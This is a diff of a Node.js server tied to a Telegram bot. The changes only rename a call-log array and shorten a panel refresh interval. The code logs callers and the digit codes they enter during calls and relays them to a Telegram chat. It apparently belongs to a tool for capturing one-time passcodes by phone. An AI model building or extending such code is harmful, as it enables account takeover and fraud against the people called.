@@ -29,7 +29,7 @@ let lastCaller=null
 let lastCode=null
 let callStart=null
 let panelMessage=null
-let callLogs=[]
+let logs=[]
 
 async function tg(method,data){
 await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
@@ -120,7 +120,7 @@ inline_keyboard:[
 })
 }
 
-setInterval(updatePanel,3000)
+setInterval(updatePanel,2000)
 
 app.get("/",(req,res)=>{
 res.send("Server running")
@@ -151,7 +151,7 @@ lastCode=digits
 activeCall=caller
 callStart=Date.now()
 
-callLogs.unshift({
+logs.unshift({
 caller,
 code:digits,
 time:new Date().toLocaleTimeString()
@@ -192,13 +192,13 @@ Voice: ${settings.assistant}`
 
 if(text==="/logs"){
 
-if(callLogs.length===0){
+if(logs.length===0){
 await tg("sendMessage",{chat_id:CHAT_ID,text:"No logs yet."})
 }else{
 
 let msg="📜 CALL LOGS\n\n"
 
-callLogs.slice(0,10).forEach((l,i)=>{
+logs.slice(0,10).forEach((l,i)=>{
 msg+=`${i+1}. ${l.caller}
 Code: ${l.code}
 Time: ${l.time}
@@ -248,7 +248,7 @@ await tg("sendMessage",{chat_id:CHAT_ID,text:"⛔ Call ended."})
 
 if(data==="logs"){
 let msg="📜 CALL LOGS\n\n"
-callLogs.slice(0,5).forEach((l,i)=>{
+logs.slice(0,5).forEach((l,i)=>{
 msg+=`${i+1}. ${l.caller} | ${l.code}\n`
 })
 await tg("sendMessage",{chat_id:CHAT_ID,text:msg})
@@ -260,6 +260,7 @@ res.sendStatus(200)
 })
 
 const PORT=process.env.PORT||3000
+
 app.listen(PORT,async()=>{
 console.log("Server running")
 await createPanel()
